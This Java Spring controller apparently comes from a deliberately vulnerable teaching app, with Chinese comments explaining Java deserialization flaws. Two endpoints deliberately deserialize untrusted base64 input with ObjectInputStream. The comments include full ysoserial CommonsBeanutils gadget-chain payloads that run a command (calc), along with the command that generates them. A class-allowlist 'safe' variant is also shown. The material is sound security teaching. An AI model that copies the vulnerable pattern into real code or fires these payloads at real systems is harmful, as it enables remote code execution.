package com.madaha.codesecone.controller.AdvancedAttack.deserialize;

import com.madaha.codesecone.controller.xxe.Student;
import org.apache.commons.io.serialization.ValidatingObjectInputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.Base64;

/**
 * 反序列化漏洞：序列化是将 Java 对象转换成字节流的过程，而反序列化是将字节流转换成 Java 对象的过程。
 *
 * <p>
 *     如何发现漏洞：
 *        1. Sink，使用了序列化和反序列化操作的方法；
 *        2. Source，将用户输入的序列化数据直接反序列化为对象；
 *        3. Sanitizer，没有对序列化数据进行任何校验或过滤；
 *
 *     Java 常见的序列化和反序列化的方法有 Java 远程序列化 和 JSON 类（fastjson、jackson）序列化。
 * </p>
 *
 * <p>
 *     序列化方法：
 *        1. ObjectInputStream.readObject（JDK）
 *        2. ObjectInputStream.readUnshared      // 可弹calc.exe。 不会执行任意代码，而是只将序列化数据恢复为原始对象。（vul Or safe）
 *        3. XMLDecode.readObject
 *        4. Yaml.load
 *        5. XStream.fromXML
 *        6. ObjectMapper.readValue
 *        7. JSON.paresObject
 *        ....
 * </p>
 */

@RestController
@RequestMapping("/Deserialize/readObject")
public class Deserialization {
    Logger log = LoggerFactory.getLogger(Deserialization.class);


    /**
     * readObject() 反序列化漏洞
     *
     * @poc   http://127.0.0.1:28888/Deserialize/readObject/vul?base64=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABOvK/rq+AAAAMwBKCgARACMHACQIACUKACYAJwoAAgAoCAApCgACACoIABIIACsIACwIAC0JABAALgoALwAwCgAvADEHADIHAEEHADQBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEALkx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTsBAAg8Y2xpbml0PgEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHQcAMgEAClNvdXJjZUZpbGUBABRDb21tYW5kVGVtcGxhdGUuamF2YQwAFAAVAQAQamF2YS9sYW5nL1N0cmluZwEAB29zLm5hbWUHADUMADYANwwAOAA5AQADd2luDAA6ADsBAAIvYwEABGJhc2gBAAItYwwAEgATBwA8DAA9AD4MAD8AQAEAE2phdmEvaW8vSU9FeGNlcHRpb24BACx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZQEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQA7eXNvc2VyaWFsL3BheWxvYWRzL3RlbXBsYXRlcy9Db21tYW5kVGVtcGxhdGUyMjExNDU0NTY0MjUwMDABAD1MeXNvc2VyaWFsL3BheWxvYWRzL3RlbXBsYXRlcy9Db21tYW5kVGVtcGxhdGUyMjExNDU0NTY0MjUwMDA7BwBBCQBDAC4BAARjYWxjCABFAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcARwoASAAjACEAEABIAAAAAQAIABIAEwAAAAIAAQAUABUAAQAWAAAALwABAAEAAAAFKrcASbEAAAACABcAAAAGAAEAAAAFABgAAAAMAAEAAAAFABkAQgAAAAgAGwAVAAEAFgAAALIAAwACAAAARBJGswBEBr0AAksSA7gABLYABRIGtgAHmQAQKgMSCFMqBBIJU6cADSoDEgpTKgQSC1MqBbIADFO4AA0qtgAOV6cABEyxAAEACgA/AEIADwADABcAAAAuAAsABQAKAAoADQAaAA4AHwAPACcAEQAsABIAMQAUADcAFgA/ABkAQgAXAEMAGgAYAAAADAABAAoAOQAcAB0AAAAeAAAADgAE/AAnBwAfCVAHACAAAAEAIQAAAAIAInVxAH4AEAAAAdTK/rq+AAAAMwAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAADHAA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAIS0ZCVk9PWkZwdwEAeHEAfgANeA==
     * @payload   java -jar ysoserial-main-1736fa42da-1.jar CommonsBeanutils192NOCC "calc" | base64
     *
     * @param   base64，编码payload
     * @return
     */
    @RequestMapping("/vul")
    public String readObject(String base64){
        try {
            log.info("[vul] 执行反序列化： " + base64);
            base64 = base64.replace(" ", "+");

            byte[] bytes = Base64.getDecoder().decode(base64);

            // 将字节转为输入流
            ByteArrayInputStream stream = new ByteArrayInputStream(bytes);

            // 反序列化流，将序列化的原始数据恢复为对象
            java.io.ObjectInputStream in = new java.io.ObjectInputStream(stream);
            in.readObject();
            in.close();

            return "反序列化漏洞！";
        }catch (Exception e){
            return "[vul] 反序列化异常！！！   Payload：java -jar ysoserial-main-1736fa42da-1.jar CommonsBeanutils192NOCC \"calc\" | base64";
        }
    }


    /**
     * 反序列化类 白/黑 名单控制
     *    “Apache Commons IO的ValidatingObjectInputStream来校验反序列化的类”
     *
     * 注意：存在被绕过的可能！！！！！
     */
    @RequestMapping("/safe")
    public String safe(String base64){
        try {
            log.info("[safe] 执行反序列化");
            base64 = base64.replace(" ", "+");

            byte[] bytes = Base64.getDecoder().decode(base64);
            ByteArrayInputStream stream = new ByteArrayInputStream(bytes);

            // 使用 ValidatingObjectInputStream，只允许反序列化 Student.class
            ValidatingObjectInputStream vois = new ValidatingObjectInputStream(stream);
            vois.accept(Student.class);
            vois.readObject();

            return "ValidatingObjectInputStream";
        } catch (Exception e){
            return e.toString();
        }
    }


    /**
     * 可弹calc.exe：
     *
     * ObjectInputStream.readUnshared()
     *    1. 该方法并不会执行任意代码，而是只会将序列化数据恢复为原始对象。
     *    2. 注意：即使只是恢复为原始对象，依然存在被利用执行命令的问题，亲测可弹出 calc.exe 计算器。
     *
     * @poc http://127.0.0.1:28888/Deserialize/readObject/vulOrSafe?base64=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABOvK/rq+AAAAMwBKCgARACMHACQIACUKACYAJwoAAgAoCAApCgACACoIABIIACsIACwIAC0JABAALgoALwAwCgAvADEHADIHAEEHADQBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEALkx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZTsBAAg8Y2xpbml0PgEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAHQcAMgEAClNvdXJjZUZpbGUBABRDb21tYW5kVGVtcGxhdGUuamF2YQwAFAAVAQAQamF2YS9sYW5nL1N0cmluZwEAB29zLm5hbWUHADUMADYANwwAOAA5AQADd2luDAA6ADsBAAIvYwEABGJhc2gBAAItYwwAEgATBwA8DAA9AD4MAD8AQAEAE2phdmEvaW8vSU9FeGNlcHRpb24BACx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL0NvbW1hbmRUZW1wbGF0ZQEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQA7eXNvc2VyaWFsL3BheWxvYWRzL3RlbXBsYXRlcy9Db21tYW5kVGVtcGxhdGUyMjExNDU0NTY0MjUwMDABAD1MeXNvc2VyaWFsL3BheWxvYWRzL3RlbXBsYXRlcy9Db21tYW5kVGVtcGxhdGUyMjExNDU0NTY0MjUwMDA7BwBBCQBDAC4BAARjYWxjCABFAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcARwoASAAjACEAEABIAAAAAQAIABIAEwAAAAIAAQAUABUAAQAWAAAALwABAAEAAAAFKrcASbEAAAACABcAAAAGAAEAAAAFABgAAAAMAAEAAAAFABkAQgAAAAgAGwAVAAEAFgAAALIAAwACAAAARBJGswBEBr0AAksSA7gABLYABRIGtgAHmQAQKgMSCFMqBBIJU6cADSoDEgpTKgQSC1MqBbIADFO4AA0qtgAOV6cABEyxAAEACgA/AEIADwADABcAAAAuAAsABQAKAAoADQAaAA4AHwAPACcAEQAsABIAMQAUADcAFgA/ABkAQgAXAEMAGgAYAAAADAABAAoAOQAcAB0AAAAeAAAADgAE/AAnBwAfCVAHACAAAAEAIQAAAAIAInVxAH4AEAAAAdTK/rq+AAAAMwAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAADHAA4AAAAMAAEAAAAFAA8AEgAAAAIAEwAAAAIAFAARAAAACgABAAIAFgAQAAlwdAAIS0ZCVk9PWkZwdwEAeHEAfgANeA==
     * @payload java -jar ysoserial-main-1736fa42da-1.jar CommonsBeanutils192NOCC "calc" | base64
     */
    @RequestMapping("/vulOrSafe")
    public String readUnshared(String base64){
        try {
            log.info("[safe] 执行反序列化： " + base64);
            base64 = base64.replace(" ", "+");

            byte[] bytes = Base64.getDecoder().decode(base64);

            // 将字节流转为输入流
            ByteArrayInputStream stream = new ByteArrayInputStream(bytes);

            // 反序列化流，将序列化的原始数据恢复为对象
            ObjectInputStream in = new ObjectInputStream(stream);
            in.readUnshared();
            in.close();

            return "ObjectInputStream.readUnshared()";
        }catch (Exception e){
            log.warn("[erroe] readUnshared反序列化失败！", e.toString());
            return "ObjectInputStream.readUnshared()";
        }
    }
}
